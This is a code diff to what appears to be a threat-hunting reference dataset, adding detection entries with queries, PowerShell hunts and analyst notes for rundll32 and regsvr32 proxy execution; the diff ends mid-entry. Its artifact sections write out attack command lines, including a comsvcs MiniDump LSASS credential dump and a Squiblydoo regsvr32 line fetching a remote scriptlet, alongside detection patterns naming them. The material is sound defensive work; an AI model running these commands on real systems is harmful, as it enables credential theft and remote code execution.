@@ -1,12 +1,15 @@
 // TA0005 - Defense Evasion (Linux complete + Windows in progress)
-// 20 indicators across 13 sub-techniques: 16 Linux, 4 Windows.
-// Windows chunk 1: T1070.001 Clear Event Logs (1), T1562.001 Defender +
-//   AMSI/ETW (2 of the shared block), T1112 Modify Registry (1).
+// 27 indicators across 19 sub-techniques: 16 Linux, 11 Windows.
+// Windows: T1070.001 Clear Event Logs, T1562.001 Defender + AMSI/ETW,
+//   T1112 Modify Registry, and the LOLBin proxy-execution set -
+//   T1218.011 Rundll32, .010 Regsvr32/Squiblydoo, .005 Mshta,
+//   .004 InstallUtil, T1127.001 MSBuild, T1218.007 Msiexec.
 // Linux: T1070 .003/.002/.006/.004, T1562 .012/.001/.004/.006,
 //   T1014 Rootkit, T1036.005/.004 Masquerading.
-// Shared theme: off-box forwarding and ingestion/EPS-gap detection on
-//   Linux; WEF, Defender for Endpoint cloud, and Script Block Logging
-//   on Windows - controls the attacker cannot reach locally.
+// Themes: off-box forwarding + EPS/ingestion-gap on Linux; WEF,
+//   Defender for Endpoint cloud, Script Block Logging on Windows;
+//   and for LOLBins, that signature/path allow-listing is useless -
+//   detection lives in command line, parent-child, and egress.
 
 const DATA = [
   {
@@ -3295,6 +3298,1367 @@ Atomic Red Team:
           { cls: "apt-cn", name: "Targeted operators (IFEO abuse)", note: "Use Image File Execution Options Debugger and SilentProcessExit registry hijacks for stealthy execution and evasion." }
         ],
         cite: "MITRE ATT&CK T1112"
+      }
+    ]
+  },
+  {
+    id: "T1218.011",
+    name: "System Binary Proxy Execution: Rundll32",
+    desc: "Abusing rundll32.exe to run a malicious DLL export, as a blank-command-line injection host (the Cobalt Strike spawnto default), or to proxy script and sensitive actions through in-box libraries (mshtml RunHTMLApplication, advpack LaunchINFSection, comsvcs MiniDump against LSASS). Signature allow-listing is useless against this signed binary, so detection keys on the command line, the parent (Office and script hosts are anomalous), and the behavior (network egress, child shells, LSASS access).",
+    rows: [
+      {
+        sub: "T1218.011 - Rundll32: Execute DLL Export (proxy execution, no-args anomaly)",
+        os: "win",
+        indicator: "Abusing the trusted rundll32.exe to load and run a malicious DLL through an exported function (rundll32 evil.dll,ExportName) or by ordinal (rundll32 evil.dll,#1), or launching rundll32 with a blank/absent command line as an injection host, so attacker code executes under a signed Microsoft binary and defeats signature-based allow-listing",
+        sysmon: `// Process create (Sysmon EID 1) - rundll32 anomalies
+Image=*\\rundll32.exe AND (
+  // DLL run from a writable/user path
+  CommandLine=(*\\Temp\\* OR *\\AppData\\* OR *\\Public\\* OR *\\ProgramData\\*
+    OR *\\Downloads\\* OR *\\Users\\Public\\*)
+  // ordinal-only export (hides the function name)
+  OR CommandLine=*,#*
+  // BLANK command line - rundll32.exe with no args = classic injection
+  // host (Cobalt Strike default spawnto) -> CommandLine is just the image
+)
+// Suspicious PARENT (office/browser/script host should not spawn rundll32)
+ParentImage=(*\\winword.exe OR *\\excel.exe OR *\\powerpnt.exe OR *\\outlook.exe
+  OR *\\mshta.exe OR *\\wscript.exe OR *\\cscript.exe OR *\\powershell.exe)
+  AND Image=*\\rundll32.exe
+
+// Image load (EID 7): a non-OS DLL loaded by rundll32 from a user path
+// Network (EID 3): rundll32.exe making an external connection
+// (rundll32 itself rarely needs the internet - egress is high-signal)
+// CreateRemoteThread (EID 8) / ProcessAccess (EID 10) for the
+// injection-host variant.`,
+        kibana: `// rundll32 with no real export / from a user path / odd parent
+process.name: "rundll32.exe" AND (
+  process.command_line: (*\\\\Temp\\\\* OR *\\\\AppData\\\\* OR *\\\\Public\\\\*
+    OR *\\\\Downloads\\\\* OR *,#*)
+  OR process.parent.name: ("winword.exe" OR "excel.exe" OR "outlook.exe"
+    OR "mshta.exe" OR "wscript.exe" OR "powershell.exe"))
+
+// rundll32 with an (almost) empty command line = injection host
+process.name: "rundll32.exe"
+AND NOT process.command_line: (*\\.dll* OR *\\.cpl* OR *,*)
+
+// rundll32 reaching out to the network (Sysmon 3)
+winlog.event_id: 3 AND process.name: "rundll32.exe"
+AND NOT destination.ip: (10.0.0.0/8 OR 172.16.0.0/12 OR 192.168.0.0/16)
+
+// rundll32 spawning a shell
+process.parent.name: "rundll32.exe"
+AND process.name: ("cmd.exe" OR "powershell.exe" OR "pwsh.exe")`,
+        powershell: `# T1218.011 - Rundll32 DLL-export proxy execution hunt
+# rundll32 is signed/trusted, so hunt the COMMAND LINE, PARENT, and
+# BEHAVIOR - not the binary itself.
+
+$sysmon='Microsoft-Windows-Sysmon/Operational'
+
+Write-Host "[*] === rundll32 process creations (EID 1) - flag anomalies ==="
+Get-WinEvent -FilterHashtable @{LogName=$sysmon;Id=1} -MaxEvents 2000 -ErrorAction SilentlyContinue |
+  Where-Object { $_.Message -match 'rundll32\\.exe' } |
+  ForEach-Object {
+    $cl = ([regex]::Match($_.Message,'CommandLine: (.+)')).Groups[1].Value
+    $pp = ([regex]::Match($_.Message,'ParentImage: (.+)')).Groups[1].Value
+    $flag = @()
+    if($cl -match 'Temp\\\\|AppData\\\\|\\\\Public\\\\|Downloads\\\\|ProgramData\\\\'){ $flag += 'user-path-DLL' }
+    if($cl -match ',#\\d'){ $flag += 'ordinal-export' }
+    if($cl -notmatch '\\.dll|\\.cpl|,'){ $flag += 'BLANK-cmdline(injection-host)' }
+    if($pp -match 'winword|excel|powerpnt|outlook|mshta|wscript|cscript|powershell'){ $flag += "office/script-parent" }
+    if($flag){ [pscustomobject]@{Time=$_.TimeCreated; Flags=($flag -join ','); Parent=(Split-Path $pp -Leaf); Cmd=$cl} }
+  } | Format-Table -Auto -Wrap
+
+Write-Host "[*] === rundll32 making network connections (EID 3) - rare/suspect ==="
+Get-WinEvent -FilterHashtable @{LogName=$sysmon;Id=3} -MaxEvents 1000 -ErrorAction SilentlyContinue |
+  Where-Object { $_.Message -match 'rundll32\\.exe' -and $_.Message -notmatch 'DestinationIp: (10\\.|172\\.(1[6-9]|2\\d|3[01])\\.|192\\.168\\.|127\\.)' } |
+  Select-Object TimeCreated, @{n='Dest';e={([regex]::Match($_.Message,'DestinationIp: (.+)')).Groups[1].Value}} -First 20 | Format-Table -Auto
+
+Write-Host "[*] === rundll32 spawning shells (EID 1 parent=rundll32) ==="
+Get-WinEvent -FilterHashtable @{LogName=$sysmon;Id=1} -MaxEvents 2000 -ErrorAction SilentlyContinue |
+  Where-Object { $_.Message -match 'ParentImage:.*rundll32\\.exe' -and $_.Message -match 'Image:.*(cmd|powershell|pwsh)\\.exe' } |
+  Select-Object TimeCreated, @{n='Child';e={([regex]::Match($_.Message,'Image: (.+)')).Groups[1].Value}} -First 20 | Format-Table -Auto`,
+        registry: `Rundll32 DLL-export proxy execution artifacts:
+
+The binary (both architectures present on every Windows host):
+  C:\\Windows\\System32\\rundll32.exe
+  C:\\Windows\\SysWOW64\\rundll32.exe
+
+Invocation forms abused:
+  rundll32.exe <dll>,<ExportFunction>        classic export call
+  rundll32.exe <dll>,#<ordinal>              ordinal hides the name
+  rundll32.exe (no arguments)                injection/hollowing host
+    - Cobalt Strike's default spawnto is rundll32.exe with no args,
+      so a rundll32 with a blank command line and network/childproc
+      activity is a high-confidence beacon-host tell.
+
+Why allow-listing fails:
+  rundll32 is a signed, in-box Microsoft binary that legitimately
+  runs constantly (control panel applets, shell verbs, printer UI).
+  Signature and path allow-listing therefore do nothing. Detection
+  must key on the ARGUMENTS, the PARENT, and the BEHAVIOR.
+
+High-signal indicators:
+  rundll32 loading a DLL from Temp/AppData/Public/Downloads/ProgramData
+  rundll32 with an empty command line (no DLL, no comma)
+  rundll32 parented by Office, a browser, mshta, or a script host
+  rundll32 making outbound network connections (it rarely should)
+  rundll32 spawning cmd.exe/powershell.exe
+  the loaded DLL (EID 7) being unsigned or from a user-writable path
+
+Persistence/COM crossover:
+  Run keys and scheduled tasks frequently invoke rundll32 to launch
+  a payload DLL; CLSID/COM hijacks resolve through rundll32 as well.
+  HKLM\\...\\Run, HKCU\\...\\Run, and Classes\\CLSID InprocServer32
+  values pointing at user-path DLLs invoked via rundll32 are worth
+  cross-referencing with persistence (T1547.001 / T1546.015).
+
+Reference:
+  LOLBAS documents the legitimate baseline and the abused forms;
+  the script/library proxy variants (mshtml, LaunchINFSection,
+  comsvcs MiniDump) are in the companion T1218.011 row.`,
+        tools: `Rundll32 as a proxy executor:
+
+Rundll32 is the single most abused LOLBin, because it is built to do
+exactly what the attacker wants: load a DLL and call one of its
+exports, under the cover of a signed Microsoft process. There is no
+patch for this; rundll32 is supposed to run DLLs, so the defender's
+job is to separate the legitimate ocean of rundll32 activity from
+the malicious drop.
+
+The three detection axes (none of which is the binary itself):
+  Arguments - a DLL path in Temp/AppData/Public, an ordinal-only
+    export to hide the function name, or no arguments at all. The
+    empty-command-line case is special: rundll32 with nothing to do
+    is a classic process-injection host, and it is the default
+    "spawnto" for Cobalt Strike beacons, so an argless rundll32 that
+    then makes network connections or spawns a shell is about as
+    clean a beacon tell as exists.
+  Parent - rundll32 legitimately launches from explorer, services,
+    and control panel, NOT from Word, Excel, Outlook, a browser, or
+    a script host. An Office-or-script parent is a maldoc chain.
+  Behavior - rundll32 reaching out to the internet, or spawning
+    cmd/powershell, is anomalous for the vast majority of real uses.
+
+Why this row matters to a hunt program:
+  rundll32 baselining pays off across the whole intrusion lifecycle:
+  it is an execution proxy, an injection host, and a persistence
+  launcher all at once. A well-tuned "rundll32 from a user path / with
+  no args / with an Office parent / talking to the network" rule set
+  catches a large slice of commodity and APT tradecraft cheaply.
+
+OT/ICS relevance:
+  on engineering workstations and HMIs that are Windows, rundll32
+  baselining is tractable because the legitimate set of rundll32
+  uses is narrow and stable - making anomalies stand out more than
+  on a noisy corporate endpoint.
+
+Threat actor use:
+  near-universal. Cobalt Strike (default spawnto), Russian (APT28/
+  APT29) and North Korean (Lazarus) sets, FIN7, and essentially all
+  ransomware affiliates use rundll32 for proxy execution, injection,
+  and persistence.`,
+        ossdetect: `Sigma rules:
+- proc_creation_win_rundll32_no_params.yml (blank command line)
+- proc_creation_win_rundll32_susp_path_dll.yml
+- proc_creation_win_office_spawn_rundll32.yml
+- net_connection_win_rundll32_net_connections.yml
+- proc_creation_win_rundll32_spawn_shell.yml
+
+Elastic detection rules:
+- Rundll32 with No Arguments (Injection Host)
+- Rundll32 Loading DLL from Unusual Location
+- Rundll32 Network Connection
+- Suspicious Rundll32 Parent (Office/Script)
+
+LOLBAS:
+  /lolbas/Binaries/Rundll32/ documents the legitimate baseline and
+  the abused invocation forms - use it to build the allow-list.
+
+Sysmon config (the telemetry that makes this detectable):
+  EID 1 process create (CommandLine + ParentImage are essential)
+  EID 3 network connection scoped to rundll32
+  EID 7 image load for unsigned/user-path DLLs in rundll32
+  EID 8/10 for the injection-host variant
+
+EDR / behavioral:
+  most EDRs flag argless rundll32 with thread injection and
+  rundll32 outbound C2; tune to your control-panel baseline.
+
+osquery:
+  SELECT pid,name,cmdline,parent FROM processes WHERE name='rundll32.exe';
+  join to process_open_sockets for network-active instances.
+
+Atomic Red Team:
+  T1218.011 - rundll32 execution and no-args injection-host tests`,
+        notes: "Rundll32 is the single most abused LOLBin because it is built to do exactly what the attacker wants: load a DLL and call one of its exports under the cover of a signed Microsoft process, and there is no patch for this since rundll32 is supposed to run DLLs, so the defender's job is to separate the legitimate ocean of rundll32 activity from the malicious drop using three axes that never involve the binary itself. The first axis is arguments: a DLL path in Temp, AppData, or Public, an ordinal-only export that hides the function name, or no arguments at all, where the empty-command-line case is special because a rundll32 with nothing to do is a classic process-injection host and the default spawnto for Cobalt Strike beacons, so an argless rundll32 that then makes network connections or spawns a shell is about as clean a beacon tell as exists. The second axis is parent: rundll32 legitimately launches from explorer, services, and control panel, not from Word, Excel, Outlook, a browser, or a script host, so an Office or script parent indicates a maldoc chain. The third axis is behavior: rundll32 reaching out to the internet or spawning cmd or powershell is anomalous for the vast majority of real uses. Rundll32 baselining pays off across the whole intrusion lifecycle because it is an execution proxy, an injection host, and a persistence launcher all at once, and a well-tuned rule set catches a large slice of commodity and APT tradecraft cheaply. On Windows engineering workstations and HMIs the baseline of legitimate rundll32 uses is narrow and stable, making anomalies stand out more than on a noisy corporate endpoint. Its use is near-universal, spanning Cobalt Strike, Russian and North Korean sets, FIN7, and essentially all ransomware affiliates, and the script and library proxy variants such as mshtml, LaunchINFSection, and the comsvcs LSASS dump are covered in the companion row.",
+        apt: [
+          { cls: "apt-mul", name: "Cobalt Strike (default spawnto)", note: "Argless rundll32.exe is the default beacon spawn-to process, making blank-command-line rundll32 with injection and C2 a high-confidence tell." },
+          { cls: "apt-ru", name: "APT28 / APT29", note: "Use rundll32 for DLL proxy execution and persistence launching across espionage operations." },
+          { cls: "apt-kp", name: "Lazarus", note: "Employs rundll32 to execute payload DLLs under a trusted signed binary as part of multi-stage loaders." }
+        ],
+        cite: "MITRE ATT&CK T1218.011"
+      },
+      {
+        sub: "T1218.011 - Rundll32: Library and Script Proxy Variants (mshtml, LaunchINFSection, comsvcs MiniDump)",
+        os: "win",
+        indicator: "Proxying execution through built-in libraries via rundll32: mshtml.dll RunHTMLApplication with a javascript: URL to run inline script, advpack/ieadvpack LaunchINFSection and setupapi InstallHinfSection to run .inf scriptlets, shell32 Control_RunDLL / ShellExec_RunDLL, and comsvcs.dll MiniDump to dump LSASS, all under the signed rundll32",
+        sysmon: `// Process create (Sysmon EID 1) - rundll32 library/script proxy forms
+Image=*\\rundll32.exe CommandLine=(
+  // inline JS via mshtml
+  *mshtml*RunHTMLApplication* OR *javascript:* OR *vbscript:*
+  // .inf scriptlet execution
+  OR *LaunchINFSection* OR *InstallHinfSection* OR *ieadvpack* OR *advpack.dll*
+  // shell proxy
+  OR *Control_RunDLL* OR *ShellExec_RunDLL*
+  // LSASS dump (credential access crossover, T1003.001)
+  OR *comsvcs.dll*MiniDump* OR *comsvcs*#24*)
+
+// comsvcs MiniDump targets LSASS -> Sysmon EID 10 ProcessAccess where
+//   TargetImage=*\\lsass.exe and SourceImage=*\\rundll32.exe
+//   GrantedAccess includes 0x1010/0x1410 (read+query)
+// EID 11 FileCreate: a .dmp written to Temp/ProgramData (the dump)
+// EID 7 ImageLoad: mshtml.dll / jscript.dll / scrobj into rundll32
+// EID 3 network: the javascript: / .inf form fetching a remote stage`,
+        kibana: `// Library/script proxy command lines
+process.name: "rundll32.exe" AND process.command_line: (
+  *RunHTMLApplication* OR *javascript\\:* OR *vbscript\\:* OR
+  *LaunchINFSection* OR *InstallHinfSection* OR *Control_RunDLL* OR
+  *ShellExec_RunDLL* OR (*comsvcs* AND (*MiniDump* OR *#24*)))
+
+// LSASS dump via comsvcs (ProcessAccess, Sysmon 10)
+winlog.event_id: 10 AND process.name: "rundll32.exe"
+AND winlog.event_data.TargetImage: *lsass.exe*
+
+// the resulting dump file (Sysmon 11)
+winlog.event_id: 11 AND process.name: "rundll32.exe"
+AND file.extension: ("dmp" OR "bin")
+
+// remote stage fetch from the mshtml/inf form (Sysmon 3)
+winlog.event_id: 3 AND process.name: "rundll32.exe"
+AND NOT destination.ip: (10.0.0.0/8 OR 172.16.0.0/12 OR 192.168.0.0/16)`,
+        powershell: `# T1218.011 - Rundll32 library/script proxy variants hunt
+# These LOLBAS one-liners proxy script or dump LSASS via rundll32.
+
+$sysmon='Microsoft-Windows-Sysmon/Operational'
+$pat = 'RunHTMLApplication|javascript:|vbscript:|LaunchINFSection|InstallHinfSection|Control_RunDLL|ShellExec_RunDLL|comsvcs.*(MiniDump|#24)'
+
+Write-Host "[*] === rundll32 library/script proxy command lines ==="
+Get-WinEvent -FilterHashtable @{LogName=$sysmon;Id=1} -MaxEvents 2000 -ErrorAction SilentlyContinue |
+  Where-Object { $_.Message -match 'rundll32\\.exe' -and $_.Message -match $pat } |
+  ForEach-Object {
+    $cl=([regex]::Match($_.Message,'CommandLine: (.+)')).Groups[1].Value
+    $kind = if($cl -match 'comsvcs'){'LSASS-DUMP(T1003.001)'} elseif($cl -match 'RunHTMLApplication|javascript:|vbscript:'){'inline-script'} elseif($cl -match 'INFSection'){'inf-scriptlet'} else {'shell-proxy'}
+    [pscustomobject]@{Time=$_.TimeCreated; Kind=$kind; Cmd=$cl}
+  } | Format-Table -Auto -Wrap
+
+Write-Host "[*] === comsvcs MiniDump access to LSASS (EID 10) ==="
+Get-WinEvent -FilterHashtable @{LogName=$sysmon;Id=10} -MaxEvents 1000 -ErrorAction SilentlyContinue |
+  Where-Object { $_.Message -match 'rundll32\\.exe' -and $_.Message -match 'lsass\\.exe' } |
+  Select-Object TimeCreated, @{n='Granted';e={([regex]::Match($_.Message,'GrantedAccess: (.+)')).Groups[1].Value}} -First 10 | Format-Table -Auto
+
+Write-Host "[*] === recent .dmp files in common dump locations ==="
+Get-ChildItem 'C:\\Windows\\Temp','C:\\ProgramData','C:\\Users\\*\\AppData\\Local\\Temp' -Filter *.dmp -Recurse -ErrorAction SilentlyContinue |
+  Select-Object FullName, Length, LastWriteTime -First 15 | Format-Table -Auto`,
+        registry: `Rundll32 library/script proxy + comsvcs MiniDump artifacts:
+
+LOLBAS one-liner forms (all under signed rundll32):
+  inline script via mshtml:
+    rundll32 mshtml.dll,RunHTMLApplication javascript:"\\..eval(...)"
+  .inf scriptlet execution:
+    rundll32 advpack.dll,LaunchINFSection evil.inf,,1,
+    rundll32 ieadvpack.dll,LaunchINFSection ...
+    rundll32 setupapi.dll,InstallHinfSection ...
+  shell proxy:
+    rundll32 shell32.dll,Control_RunDLL <payload>.cpl
+    rundll32 shell32.dll,ShellExec_RunDLL <command>
+  LSASS credential dump (credential-access crossover, T1003.001):
+    rundll32 C:\\Windows\\System32\\comsvcs.dll, MiniDump <lsass_pid>
+      C:\\path\\out.dmp full
+    (the MiniDump export, also reachable by ordinal #24)
+
+The comsvcs MiniDump path deserves special attention:
+  it turns rundll32 into an LSASS dumper using only in-box,
+  signed components - no Mimikatz binary on disk. The tells:
+    Sysmon EID 10 ProcessAccess: SourceImage rundll32 ->
+      TargetImage lsass.exe with read/query GrantedAccess
+    Sysmon EID 11: a .dmp/.bin written to Temp/ProgramData
+    the command line literally containing "comsvcs" + "MiniDump"
+  This is one of the highest-value single detections on Windows:
+  legitimate software essentially never calls comsvcs MiniDump
+  against lsass.
+
+Libraries involved (baseline references):
+  mshtml.dll, advpack.dll, ieadvpack.dll, setupapi.dll, shell32.dll,
+  comsvcs.dll - all legitimate, all in System32; the abuse is the
+  EXPORT + ARGUMENT combination, not the library's presence.
+
+Cross-reference:
+  the comsvcs MiniDump form is credential access (T1003.001 LSASS
+  Memory) executed via the T1218.011 proxy - wire it into both the
+  LOLBin and the credential-access detections. The .inf and
+  javascript forms often fetch a remote stage (Sysmon EID 3).`,
+        tools: `Rundll32's library and script proxy forms:
+
+Beyond loading an attacker DLL, rundll32 can be pointed at in-box
+Microsoft libraries to proxy script execution or to perform
+sensitive actions - all while remaining a signed, trusted process.
+These are the LOLBAS one-liners every operator knows.
+
+The script proxies:
+  mshtml.dll!RunHTMLApplication runs an inline javascript: payload;
+  advpack/ieadvpack!LaunchINFSection and setupapi!InstallHinfSection
+  execute a .inf scriptlet (often fetching a remote stage); shell32's
+  Control_RunDLL and ShellExec_RunDLL launch applets and commands.
+  Each is detectable by its distinctive export-plus-argument string
+  in the rundll32 command line, and several reach out to the network.
+
+The credential-access proxy (the one to prioritize):
+  rundll32 comsvcs.dll,MiniDump <lsass-pid> <outfile> full dumps
+  LSASS memory using only signed in-box components - no third-party
+  dumper touches disk. It is simultaneously a LOLBin (T1218.011) and
+  credential theft (T1003.001). The detection is unusually clean:
+  a ProcessAccess from rundll32 to lsass.exe with read access, a
+  .dmp appearing in Temp, and the literal "comsvcs"+"MiniDump" in the
+  command line. Legitimate software effectively never does this, so
+  the false-positive rate is near zero and the severity is high.
+
+How to treat these in a program:
+  fold the comsvcs MiniDump rule into LSASS-access detection (it is
+  one of the cheapest high-fidelity credential-dump catches), and
+  fold the script-proxy forms into the broader LOLBin command-line
+  rule set. Because they fetch remote stages, rundll32 network egress
+  remains a strong corroborator.
+
+Threat actor use:
+  comsvcs MiniDump is a favorite of intrusion sets that prefer
+  living-off-the-land credential theft (it avoids dropping Mimikatz);
+  the inf/javascript proxies appear in maldoc and loader chains
+  across commodity and targeted operations.`,
+        ossdetect: `Sigma rules:
+- proc_creation_win_rundll32_comsvcs_minidump_lsass.yml
+- proc_creation_win_rundll32_inf_launch.yml
+- proc_creation_win_rundll32_mshtml_runhtmlapplication.yml
+- proc_creation_win_rundll32_shell32_control_rundll.yml
+
+Elastic detection rules:
+- LSASS Memory Dump via comsvcs.dll MiniDump
+- Rundll32 InstallHinfSection / LaunchINFSection Execution
+- Rundll32 RunHTMLApplication Inline Script
+
+The comsvcs MiniDump detection (highest priority):
+  Sysmon EID 10 ProcessAccess: SourceImage *\\rundll32.exe,
+    TargetImage *\\lsass.exe, GrantedAccess ~0x1010/0x1410
+  plus EID 11 .dmp creation. Pair with credential-access (T1003.001)
+  alerting; near-zero false positives.
+
+LOLBAS:
+  /lolbas/Binaries/Rundll32/ enumerates the mshtml, advpack,
+  ieadvpack, setupapi, shell32, and comsvcs proxy forms.
+
+Sysmon config:
+  EID 1 (command line), 3 (network for remote-stage fetch),
+  7 (mshtml/jscript image load), 10 (lsass access), 11 (.dmp).
+
+Credential-dump hardening:
+  enable LSASS protection (RunAsPPL), Credential Guard, and
+  Attack Surface Reduction "block credential stealing from lsass"
+  to raise the cost of the comsvcs path.
+
+Atomic Red Team:
+  T1218.011 / T1003.001 - comsvcs MiniDump and rundll32 proxy tests`,
+        notes: "Beyond loading an attacker DLL, rundll32 can be pointed at in-box Microsoft libraries to proxy script execution or perform sensitive actions while remaining a signed, trusted process, and these are the LOLBAS one-liners every operator knows. The script proxies include mshtml.dll RunHTMLApplication running an inline javascript: payload, advpack and ieadvpack LaunchINFSection and setupapi InstallHinfSection executing a .inf scriptlet that often fetches a remote stage, and shell32's Control_RunDLL and ShellExec_RunDLL launching applets and commands, each detectable by its distinctive export-plus-argument string in the rundll32 command line with several reaching out to the network. The credential-access proxy is the one to prioritize: rundll32 comsvcs.dll,MiniDump with an lsass PID, an output file, and the full flag dumps LSASS memory using only signed in-box components so no third-party dumper touches disk, which makes it simultaneously a LOLBin (T1218.011) and credential theft (T1003.001). The detection is unusually clean, requiring a ProcessAccess from rundll32 to lsass.exe with read access, a .dmp appearing in Temp, and the literal comsvcs and MiniDump strings in the command line, and because legitimate software effectively never does this the false-positive rate is near zero while the severity is high. In a program the comsvcs MiniDump rule should be folded into LSASS-access detection as one of the cheapest high-fidelity credential-dump catches, while the script-proxy forms fold into the broader LOLBin command-line rule set, and since they fetch remote stages rundll32 network egress remains a strong corroborator. The comsvcs MiniDump form is a favorite of intrusion sets that prefer living-off-the-land credential theft because it avoids dropping Mimikatz, while the inf and javascript proxies appear in maldoc and loader chains across commodity and targeted operations. LSASS protection via RunAsPPL, Credential Guard, and the ASR rule blocking credential stealing from lsass raise the cost of the comsvcs path.",
+        apt: [
+          { cls: "apt-mul", name: "Living-off-the-land operators", note: "comsvcs.dll MiniDump is widely used to dump LSASS with only signed in-box components, avoiding a Mimikatz binary on disk." },
+          { cls: "apt-ir", name: "Iranian intrusion sets", note: "Use rundll32 .inf and script proxy forms in loader chains, often fetching remote stages over the network." },
+          { cls: "apt-mul", name: "Maldoc / loader chains", note: "mshtml RunHTMLApplication and LaunchINFSection proxy forms appear in document-borne and commodity loader execution." }
+        ],
+        cite: "MITRE ATT&CK T1218.011"
+      }
+    ]
+  },
+  {
+    id: "T1218.010",
+    name: "System Binary Proxy Execution: Regsvr32",
+    desc: "The Squiblydoo technique: regsvr32 /i:http://host/file.sct scrobj.dll fetches and runs a remote COM scriptlet with no disk write under a signed, application-control-bypassing binary. The defining tell is that regsvr32 is not a network client, so any outbound connection from it, combined with the /i:URL argument and the scrobj.dll load, is high-confidence.",
+    rows: [
+      {
+        sub: "T1218.010 - Regsvr32: Squiblydoo Scriptlet Execution",
+        os: "win",
+        indicator: "Abusing regsvr32.exe to execute a local or remote COM scriptlet (.sct) through scrobj.dll: the Squiblydoo technique regsvr32 /s /n /u /i:http://host/file.sct scrobj.dll runs script with no disk write and under a signed, network-capable Microsoft binary, bypassing many application-control policies",
+        sysmon: `// Process create (Sysmon EID 1) - regsvr32 Squiblydoo
+Image=*\\regsvr32.exe CommandLine=(
+  // remote scriptlet fetch (the signature pattern)
+  *\\/i:http* OR *\\/i:https* OR *\\/i:ftp* OR *scrobj* OR *.sct*
+  // the /u /i unregister+install trick
+  OR (*\\/u* AND *\\/i*))
+// unusual PARENT (office/script host -> regsvr32 = maldoc chain)
+ParentImage=(*\\winword.exe OR *\\excel.exe OR *\\outlook.exe OR *\\mshta.exe
+  OR *\\wscript.exe OR *\\powershell.exe) AND Image=*\\regsvr32.exe
+
+// Network (EID 3): regsvr32.exe making an outbound connection -
+//   regsvr32 should essentially NEVER talk to the internet, so this
+//   alone is a strong Squiblydoo tell.
+// Image load (EID 7): scrobj.dll + jscript/vbscript loaded by regsvr32
+// DNS (EID 22): regsvr32.exe resolving an external host
+// regsvr32 spawning a shell (EID 1 parent=regsvr32)`,
+        kibana: `// Squiblydoo command-line signature
+process.name: "regsvr32.exe" AND process.command_line: (
+  *"/i:http"* OR *"/i:https"* OR *"/i:ftp"* OR *scrobj* OR *.sct*
+  OR (*"/u"* AND *"/i"*))
+
+// regsvr32 reaching the network (Sysmon 3) - almost never legitimate
+winlog.event_id: 3 AND process.name: "regsvr32.exe"
+AND NOT destination.ip: (10.0.0.0/8 OR 172.16.0.0/12 OR 192.168.0.0/16)
+
+// scrobj.dll loaded by regsvr32 (Sysmon 7) with script engines
+winlog.event_id: 7 AND process.name: "regsvr32.exe"
+AND file.name: ("scrobj.dll" OR "jscript.dll" OR "vbscript.dll")
+
+// Office/script parent -> regsvr32 (maldoc chain)
+process.name: "regsvr32.exe"
+AND process.parent.name: ("winword.exe" OR "excel.exe" OR "outlook.exe"
+  OR "mshta.exe" OR "wscript.exe" OR "powershell.exe")`,
+        powershell: `# T1218.010 - Regsvr32 Squiblydoo hunt
+# The two strongest tells: an /i:http(s) command line, and regsvr32
+# making ANY network connection (it should not).
+
+$sysmon='Microsoft-Windows-Sysmon/Operational'
+
+Write-Host "[*] === regsvr32 Squiblydoo command lines (EID 1) ==="
+Get-WinEvent -FilterHashtable @{LogName=$sysmon;Id=1} -MaxEvents 2000 -ErrorAction SilentlyContinue |
+  Where-Object { $_.Message -match 'regsvr32\\.exe' -and $_.Message -match '/i:(http|ftp)|scrobj|\\.sct|(/u.*/i)' } |
+  ForEach-Object {
+    $cl=([regex]::Match($_.Message,'CommandLine: (.+)')).Groups[1].Value
+    $pp=([regex]::Match($_.Message,'ParentImage: (.+)')).Groups[1].Value
+    [pscustomobject]@{Time=$_.TimeCreated; Parent=(Split-Path $pp -Leaf); Cmd=$cl}
+  } | Format-Table -Auto -Wrap
+
+Write-Host "[*] === regsvr32 network connections (EID 3) - high-signal ==="
+Get-WinEvent -FilterHashtable @{LogName=$sysmon;Id=3} -MaxEvents 1000 -ErrorAction SilentlyContinue |
+  Where-Object { $_.Message -match 'regsvr32\\.exe' } |
+  Select-Object TimeCreated, @{n='Dest';e={([regex]::Match($_.Message,'DestinationIp: (.+)')).Groups[1].Value}},
+    @{n='Port';e={([regex]::Match($_.Message,'DestinationPort: (.+)')).Groups[1].Value}} -First 20 | Format-Table -Auto
+
+Write-Host "[*] === regsvr32 with Office/script parent or spawning a shell ==="
+Get-WinEvent -FilterHashtable @{LogName=$sysmon;Id=1} -MaxEvents 2000 -ErrorAction SilentlyContinue |
+  Where-Object { ($_.Message -match 'ParentImage:.*(winword|excel|outlook|mshta|wscript|powershell)' -and $_.Message -match 'Image:.*regsvr32') -or ($_.Message -match 'ParentImage:.*regsvr32' -and $_.Message -match 'Image:.*(cmd|powershell)\\.exe') } |
+  Select-Object TimeCreated, @{n='Chain';e={(([regex]::Match($_.Message,'ParentImage: (.+)')).Groups[1].Value)+' -> '+(([regex]::Match($_.Message,'Image: (.+)')).Groups[1].Value)}} -First 20 | Format-Table -Auto -Wrap`,
+        registry: `Regsvr32 Squiblydoo artifacts:
+
+The binary (both architectures):
+  C:\\Windows\\System32\\regsvr32.exe
+  C:\\Windows\\SysWOW64\\regsvr32.exe
+
+The Squiblydoo command line (the signature):
+  regsvr32 /s /n /u /i:http://host/payload.sct scrobj.dll
+    /s  silent
+    /n  do not call DllRegisterServer
+    /u  unregister  } the /u /i pair invokes the scriptlet's
+    /i  install     } Unregister section without registering anything
+    /i:URL  fetches a remote .sct COM scriptlet
+    scrobj.dll  the Microsoft Script Component runtime that runs it
+
+Why it is powerful:
+  - signed and trusted (regsvr32 + scrobj.dll are in-box Microsoft)
+  - network-capable (/i:http pulls the scriptlet remotely)
+  - fileless (the .sct runs from the URL; nothing dropped to disk)
+  - bypasses many AppLocker/WDAC configurations historically
+  The script inside the .sct is JScript/VBScript and typically
+  bootstraps PowerShell or a downloader.
+
+High-signal indicators (ranked):
+  1. regsvr32 making ANY outbound network connection (Sysmon EID 3)
+     - it essentially never should; this alone is strong.
+  2. /i:http(s)/ftp in the regsvr32 command line.
+  3. scrobj.dll + jscript/vbscript loaded by regsvr32 (EID 7).
+  4. Office/script-host parent, or regsvr32 spawning cmd/powershell.
+  5. .sct files dropped in Temp/AppData (local Squiblydoo variant).
+
+Hardening / context:
+  modern WDAC and AppLocker (with the right rules) and ASR can
+  constrain scrobj/script execution; newer Windows mitigates some
+  Squiblydoo variants, but the network + command-line tells remain
+  the reliable detection regardless of OS version.
+
+Reference:
+  LOLBAS /lolbas/Binaries/Regsvr32/ documents the baseline and the
+  scriptlet abuse forms.`,
+        tools: `Regsvr32 Squiblydoo:
+
